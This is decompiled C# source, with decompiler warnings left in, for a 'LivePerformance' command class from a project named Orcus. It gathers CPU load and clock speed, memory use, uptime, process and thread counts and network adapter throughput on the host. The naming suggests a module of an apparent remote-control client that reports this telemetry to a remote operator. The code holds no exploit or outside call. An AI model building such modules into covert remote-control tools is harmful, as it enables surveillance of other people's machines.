using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Management;
using Orcus.Native;
using Orcus.Shared.Commands.LivePerformance;
using Orcus.Utilities;

namespace Orcus.Commands.LivePerformance;

internal class LivePerformance : IDisposable
{
	private readonly PerformanceCounter _cpuPerformanceCounter;

	private readonly Dictionary<string, PerformanceCounter> _receiveCounters;

	private readonly Dictionary<string, PerformanceCounter> _sendCounters;

	public LivePerformance()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		_cpuPerformanceCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
		PerformanceCounterCategory val = new PerformanceCounterCategory("Network Interface");
		_sendCounters = new Dictionary<string, PerformanceCounter>();
		_receiveCounters = new Dictionary<string, PerformanceCounter>();
		string[] instanceNames = val.GetInstanceNames();
		foreach (string text in instanceNames)
		{
			_sendCounters.Add(text, new PerformanceCounter("Network Interface", "Bytes Sent/sec", text));
			_receiveCounters.Add(text, new PerformanceCounter("Network Interface", "Bytes Received/sec", text));
		}
	}

	public void Dispose()
	{
		((Component)(object)_cpuPerformanceCounter).Dispose();
		foreach (KeyValuePair<string, PerformanceCounter> sendCounter in _sendCounters)
		{
			((Component)(object)sendCounter.Value).Dispose();
		}
		foreach (KeyValuePair<string, PerformanceCounter> receiveCounter in _receiveCounters)
		{
			((Component)(object)receiveCounter.Value).Dispose();
		}
	}

	public LiveData GetData()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		LiveData val = new LiveData();
		val.set_Handles(0);
		val.set_Threads(0);
		LiveData val2 = val;
		Process[] processes = Process.GetProcesses();
		val2.set_Processes(processes.Length);
		Process[] array = processes;
		foreach (Process process in array)
		{
			val2.set_Handles(val2.get_Handles() + process.HandleCount);
			val2.set_Threads(val2.get_Threads() + process.Threads.Count);
		}
		val2.set_ClockSpeed(GetCpuSpeedInGHz());
		val2.set_InUse((byte)Math.Round(_cpuPerformanceCounter.NextValue(), 0));
		val2.set_UpTimeSeconds((uint)(CoreHelper.RunningOnVistaOrGreater ? (NativeMethods.GetTickCount64() / 1000uL) : (NativeMethods.GetTickCount() / 1000u)));
		MEMORYSTATUSEX mEMORYSTATUSEX = new MEMORYSTATUSEX();
		if (NativeMethods.GlobalMemoryStatusEx(mEMORYSTATUSEX))
		{
			val2.set_UsedMemory(mEMORYSTATUSEX.ullTotalPhys - mEMORYSTATUSEX.ullAvailPhys);
		}
		val2.set_EthernetAdapterData(new List<EthernetAdapterData>());
		foreach (KeyValuePair<string, PerformanceCounter> receiveCounter in _receiveCounters)
		{
			List<EthernetAdapterData> ethernetAdapterData = val2.get_EthernetAdapterData();
			EthernetAdapterData val3 = new EthernetAdapterData();
			val3.set_Name(receiveCounter.Key);
			val3.set_BytesReceive(receiveCounter.Value.NextValue());
			val3.set_BytesSend(_sendCounters[receiveCounter.Key].NextValue());
			ethernetAdapterData.Add(val3);
		}
		return val2;
	}

	private uint GetCpuSpeedInGHz()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
		try
		{
			return ((IEnumerable)val.Get()).OfType<ManagementObject>().FirstOrDefault()?.TryGetProperty<uint>("CurrentClockSpeed") ?? 0;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}
}
